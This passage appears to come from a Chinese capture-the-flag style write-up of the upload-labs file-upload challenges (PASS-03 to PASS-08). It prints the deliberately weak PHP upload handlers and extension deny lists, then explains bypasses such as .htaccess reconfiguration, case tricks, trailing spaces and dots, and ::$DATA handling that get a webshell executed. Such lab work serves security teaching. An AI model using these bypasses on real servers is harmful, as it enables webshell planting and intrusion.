<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>尝试上传一个php文件时，它报出不能上传的文件后缀名，初步判断我们常见的文件后缀名都不能上传成功。<br><img src="https://img-blog.csdnimg.cn/792331611b5d4f73b0f74752013ed6c1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>结果就是确实可以上传成功，但是不能成功解析上线webshell，所以并没有什么用处。<br><img src="https://img-blog.csdnimg.cn/086afefa43ff471787b31fd65754d0cd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>但是我们可以通过模糊后缀名，通过十六进制后缀截断可以成功解析webshell<br><img src="https://img-blog.csdnimg.cn/32a5889a1c1c47b69dbfd1edbc34beb2.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/46d3effc083f4bbb88c3fbea10cd2ec3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="PASS-04"><a href="#PASS-04" class="headerlink" title="PASS-04"></a>PASS-04</h2><p>从源代码中可以看出，几乎把所有常见的文件后缀名都禁止了。但是唯独没有禁止<code>.htaccess</code>文件的上传</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>我们尝试上传一个.htaccess文件，将文件内容设置为将所有文件都当作php文件进行解析<br><img src="https://img-blog.csdnimg.cn/1865d34d8d944f06ab4f74871174752d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_19,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后我们上传一个图片木马文件，显示了上传的路径<br><img src="https://img-blog.csdnimg.cn/44ce0e8cf4164409a79033b13c1bb8dd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>成功解析webshell<br><img src="https://img-blog.csdnimg.cn/e93fa1245b8e41e4802f01d2ff22e52a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="PASS-05"><a href="#PASS-05" class="headerlink" title="PASS-05"></a>PASS-05</h2><p>从源代码中可以分析出，开发者除了过滤了常见的文件格式外，还过滤了<code>.htaccess</code>文件和点、::$DATA、空格。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/76d355b7739042b2a9079c3d9e76426e.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/ec06593593ff4389881268b98ee13ac0.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/e49e5f7d48e245a19bc70572cc4fa6bb.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/8e657f8906584cc9b21826e7e99401dd.png" alt="在这里插入图片描述"><br><strong>补：</strong> 这里<code>::$DATA</code>的原理是Windows操作系统会将<code>::$DATA</code>去除，最后留下文件名进行解析，这里我们利用的方式相同，采用点空格点的方法<br><img src="https://img-blog.csdnimg.cn/beff52acf7eb4f62b6c3d517f7639735.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2f38148c4f7544ee9e7fe817968e4ffb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="PASS-06"><a href="#PASS-06" class="headerlink" title="PASS-06"></a>PASS-06</h2><p>对比上一关的源码，这里没有对文件名进行小写</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以我们使用点空格点的方法，虽然能够成功上传文件，但是并不能解析出文件名后缀，所以不能利用<br><img src="https://img-blog.csdnimg.cn/ac74e3b6dc174b4fbaddebe36a317984.png" alt="在这里插入图片描述"><br>但是我们可以通过大小写绕过的方式进行利用<br><img src="https://img-blog.csdnimg.cn/1fc77e2bc40d4170bc262c23bd4eb214.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/05c09ed1bbe04467bf64eb084f02601e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="PASS-07"><a href="#PASS-07" class="headerlink" title="PASS-07"></a>PASS-07</h2><p>我们在分析源码时发现，它与第五关的区别是最后没有进行首尾去空，这样我们就可以通过在文件名后缀上输入空格进行绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用Windows的特性，创建文件时，会忽略文件后缀空格，保留完整的文件后缀名<br><img src="https://img-blog.csdnimg.cn/fadef61abd584135acd24a42fca865a7.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/7bf50ccb68a246118b0db2dd1cb882b6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="PASS-08"><a href="#PASS-08" class="headerlink" title="PASS-08"></a>PASS-08</h2><p>和第五题的区别是，它并没有删除尾端的点，所以我们可以利用这个进行绕过，原理也是利用Windows去除尾端小数点的特性进行漏洞利用</p>
